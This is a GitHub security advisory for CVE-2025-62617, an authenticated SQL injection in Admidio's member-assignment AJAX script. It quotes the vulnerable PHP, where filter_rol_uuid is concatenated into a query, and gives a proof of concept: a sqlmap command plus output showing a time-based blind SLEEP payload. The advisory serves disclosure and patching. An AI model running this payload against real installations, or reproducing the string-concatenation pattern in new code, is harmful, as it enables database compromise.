# [H] Admidio Vulnerable to Authenticated SQL Injection in Member Assignment Functionality

## Summary
Severity: High
Advisory: GHSA-2v5m-cq9w-fc33
CVE: CVE-2025-62617
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-10-22
Source: https://github.com/advisories/GHSA-2v5m-cq9w-fc33
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <4.3.17

## Details
### Summary

An authenticated SQL injection vulnerability exists in the member assignment data retrieval functionality of Admidio. Any authenticated user with permissions to assign members to a role (such as an administrator) can exploit this vulnerability to execute arbitrary SQL commands. This can lead to a full compromise of the application's database, including reading, modifying, or deleting all data. The vulnerability is present in the latest version, 4.3.16.

### Details

The vulnerability is located in the `adm_program/modules/groups-roles/members_assignment_data.php` script. This script handles an AJAX request to fetch a list of users for role assignment. The `filter_rol_uuid` GET parameter is not properly sanitized before being used in a raw SQL query.

**File:** `adm_program/modules/groups-roles/members_assignment_data.php`
```php
// ... 
// The parameter is retrieved from the GET request without sufficient sanitization for SQL context.
$getFilterRoleUuid = admFuncVariableIsValid($_GET, 'filter_rol_uuid', 'string');
$getMembersShowAll = admFuncVariableIsValid($_GET, 'mem_show_all', 'bool', array('defaultValue' => false));

// ... 
$filterRoleCondition = '';
if ($getMembersShowAll) {
    $getFilterRoleUuid = 0;
} else {
    // show only members of current organization
    if ($getFilterRoleUuid !== '') {
        // VULNERABLE CODE: $getFilterRoleUuid is directly concatenated into the query string.
        $filterRoleCondition = ' AND rol_uuid = \''.$getFilterRoleUuid . '\'';
    }
}

// ...
// The vulnerable $filterRoleCondition is then used inside a subselect.
$sqlSubSelect = '(SELECT COUNT(*) AS count_this
                    FROM '.TBL_MEMBERS.'
              INNER JOIN '.TBL_ROLES.'
                      ON rol_id = mem_rol_id
              INNER JOIN '.TBL_CATEGORIES.'
                      ON cat_id = rol_cat_id
                   WHERE mem_usr_id  = usr_id
                     AND mem_begin  <= \''.DATE_NOW.'\'
                     AND mem_end     > \''.DATE_NOW.'\'
                         '.$filterRoleCondition.'
                     AND rol_valid = true
                     AND cat_name_intern <> \'EVENTS\'
                     AND cat_org_id = '.$gCurrentOrgId.')';
// ...
```

As shown above, the value of `$getFilterRoleUuid` is directly concatenated into the `$filterRoleCondition` variable, which is then embedded within a larger SQL query (`$sqlSubSelect`). This allows an attacker to break out of the string literal and inject arbitrary SQL commands.

### PoC (Proof of Concept)

**Prerequisites:**
1.  A running instance of Admidio (tested on version 4.3.16).
2.  An authenticated user session with permissions to assign members to a role (e.g., the default 'admin' user).

**Execution:**
The vulnerability can be triggered by manipulating the `filter_rol_uuid` parameter in the request to `/adm_program/modules/groups-roles/members_assignment_data.php`. Due to the large number of parameters, the easiest way to reproduce this is by capturing a legitimate request and replaying it with `sqlmap`.

1.  Log in to Admidio as an administrator.
2.  Navigate to `Groups / Roles`.
3.  Click the "Assign members" icon for any existing role.
4.  Using a web proxy like Burp Suite, intercept the GET request made to `/adm_program/modules/groups-roles/members_assignment_data.php`.
5.  Save the entire raw request to a text file (e.g., `admidio_request.txt`).
6.  Run the following `sqlmap` command to confirm the time-based blind SQL injection:

```bash
sqlmap -r /path/to/admidio_request.txt -p filter_rol_uuid --technique=T --dbms=mysql --current-db
```

**Result:**
`sqlmap` will successfully identify and exploit the time-based blind SQL injection vulnerability.

```
---
Parameter: filter_rol_uuid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: role_uuid=...&filter_rol_uuid=' AND (SELECT 3332 FROM (SELECT(SLEEP(5)))vqnl) AND 'ENdG'='ENdG&...
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[INFO] fetching current database
[INFO] retrieved: admidio
current database: 'admidio'
```
This confirms that an attacker can execute arbitrary SQL queries and extract information from the database.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
- https://nvd.nist.gov/vuln/detail/CVE-2025-62617
- https://github.com/Admidio/admidio/commit/fde81ae869e88a3cf42201f2548d57df785a37cb
- https://github.com/Admidio/admidio
